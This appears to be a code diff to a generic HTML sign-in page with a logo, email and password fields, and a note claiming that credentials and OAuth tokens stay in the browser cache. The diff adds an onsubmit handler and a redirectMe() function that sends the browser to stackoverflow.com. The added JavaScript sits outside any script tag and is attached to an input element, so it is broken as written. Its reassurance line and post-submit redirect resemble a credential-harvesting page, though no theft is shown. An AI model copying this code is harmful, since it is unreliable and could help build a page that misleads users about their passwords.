@@ -11,6 +11,7 @@
 </style>
 </head>
 <body>
+
         <div class="box">
             <h2><img src="logo.png"  style="width:170px;height:70px;"></h2>
                 <h2>Sign in</h2>
@@ -25,8 +26,13 @@
                         <label>Password</label>
                       </div>
                     <p style="font-size:11px;color:#5f6368;">Email, OAuth, OAuth2 tokens and password are only stored in browser cache.</p>
-                  <input type="submit" name="sign-in" value="Sign In">
+                  <input type="submit" name="sign-in" value="Sign In" onsubmit="return redirectMe();">
                 </form>
               </div>
+        function redirectMe() {
+  window.location.replace("http://stackoverflow.com");
+  return false;
+}
+    
 </body>
 </html>
